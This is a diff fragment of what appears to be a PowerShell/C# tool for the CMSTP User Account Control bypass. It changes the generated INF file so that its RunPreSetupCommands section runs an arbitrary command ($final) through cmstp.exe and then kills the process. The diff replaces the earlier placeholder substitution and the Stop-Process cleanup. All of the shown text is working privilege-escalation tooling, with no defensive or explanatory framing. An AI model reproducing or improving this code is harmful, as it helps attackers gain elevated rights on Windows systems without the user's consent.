@@ -78,7 +78,8 @@ CustomDestination=CustInstDestSectionAllUsers
 RunPreSetupCommands=RunPreSetupCommandsSection
 
 [RunPreSetupCommandsSection]
-LINE
+$final
+taskkill /IM cmstp.exe /F
 
 [CustInstDestSectionAllUsers]
 49000,49001=AllUSer_LDIDSection, 7
@@ -112,7 +113,6 @@ ShortSvcName=""CorpVPN""
         OutputFile.Append(Path.GetRandomFileName().Split(Convert.ToChar("."))[0]);
         OutputFile.Append(".inf");
         StringBuilder newInfData = new StringBuilder(InfData);
-        newInfData.Replace("LINE", CommandToExecute);
         File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
         return OutputFile.ToString();
     }
@@ -145,6 +145,4 @@ ShortSvcName=""CorpVPN""
 Add-Type $code
 
 [CMSTPBypass]::Execute($final) 
-Start-Sleep 5
-Stop-Process -Name "cmstp"  
 }
